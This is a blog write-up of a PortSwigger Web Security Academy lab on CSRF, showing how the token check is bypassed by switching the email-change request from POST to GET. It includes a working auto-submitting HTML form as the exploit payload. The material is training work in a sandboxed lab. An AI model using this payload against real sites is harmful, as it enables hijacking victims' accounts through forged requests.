<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
  Lab: CSRF where token validation depends on request method
  #


  tags: Portswigger Web Security Academy Web
  #


Description: This lab&rsquo;s email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.
Goal:  To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer&rsquo;s email address.
You can log in to your own account using the following credentials: wiener:peter


  Recon
  #



Login and update email to trace the package
Like the previous lab, we first login to the website and update the email. At the same time, we can trace update email package shown below:

We can notice that the carried data including csrf_token"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-request-method/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Lab: CSRF where token validation depends on request method"><meta property="og:description" content="Lab: CSRF where token validation depends on request method # tags: Portswigger Web Security Academy Web # Description: This lab’s email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests. Goal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address. You can log in to your own account using the following credentials: wiener:peter Recon # Login and update email to trace the package Like the previous lab, we first login to the website and update the email. At the same time, we can trace update email package shown below: We can notice that the carried data including csrf_token"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="Portswigger Web Security Academy"><meta property="article:tag" content="Web"><title>Lab: CSRF where token validation depends on request method | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-request-method/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Lab: CSRF where token validation depends on request method</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#recon>Recon</a></li><li><a href=#exp---change-post-to-get-to-bypass-csrf>Exp - Change POST to GET to bypass CSRF</a></li><li><a href=#reference>Reference</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=lab-csrf-where-token-validation-depends-on-request-method>Lab: CSRF where token validation depends on request method
<a class=anchor href=#lab-csrf-where-token-validation-depends-on-request-method>#</a></h1><h6 id=tags-portswigger-web-security-academy-web>tags: <code>Portswigger Web Security Academy</code> <code>Web</code>
<a class=anchor href=#tags-portswigger-web-security-academy-web>#</a></h6><ul><li>Description: This lab&rsquo;s email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.</li><li>Goal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer&rsquo;s email address.
You can log in to your own account using the following credentials: <code>wiener:peter</code></li></ul><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><ol><li><p>Login and update email to trace the package
Like the previous lab, we first login to the website and update the email. At the same time, we can trace update email package shown below:
<img src=https://i.imgur.com/ju0fDUQ.png alt>
We can notice that the carried data including <code>csrf_token</code></p></li><li><p>According to <a href=https://zhuanlan.zhihu.com/p/517735618>从0到1完全掌握 CSRF</a> and <a href=https://blog.csdn.net/ZripenYe/article/details/120793710>CSDN write up</a>
:::info
We know that using some technique can bypass this protection $\to$
1. <font color=FF0000><strong>Delete <code>csrf_token</code> data</strong></font>
2. <font color=FF0000><strong>change <code>POST</code> method to <code>GET</code> method</strong></font></p><p>In this lab, we use the 2nd method to bypass CSRF
:::
<img src=https://i.imgur.com/U0mBdv8.png alt>
You can see that the response status is 302 which means it&rsquo;s a good way to forge a CSRF package</p></li></ol><h2 id=exp---change-post-to-get-to-bypass-csrf>Exp - Change POST to GET to bypass CSRF
<a class=anchor href=#exp---change-post-to-get-to-bypass-csrf>#</a></h2><p>Follow the self-created package at previous lab
Exploit Payload:</p><pre tabindex=0><code class="language-javascript=" data-lang="javascript=">&lt;html&gt;
  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
  &lt;body&gt;
    &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)&lt;/script&gt;
 
    &lt;form action=&#34;https://0a9700ef04043a66801b0d0e00d10084.web-security-academy.net/my-account/change-email?email=bernie6401%40gmail.com&#34; method=&#34;GET&#34;&gt;
      &lt;input type=&#34;hidden&#34; name=&#34;email&#34; value=&#34;danger&amp;#64;gmail&amp;#46;com&#34; /&gt;
    &lt;/form&gt;
    &lt;script&gt;
          document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre><p>:::spoiler Success Screenshot
<img src=https://i.imgur.com/lKFkGTy.png alt>
:::</p><h2 id=reference>Reference
<a class=anchor href=#reference>#</a></h2><p><a href=https://zhuanlan.zhihu.com/p/517735618>从0到1完全掌握 CSRF</a></p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#recon>Recon</a></li><li><a href=#exp---change-post-to-get-to-bypass-csrf>Exp - Change POST to GET to bypass CSRF</a></li><li><a href=#reference>Reference</a></li></ul></nav></div></aside></main></body></html>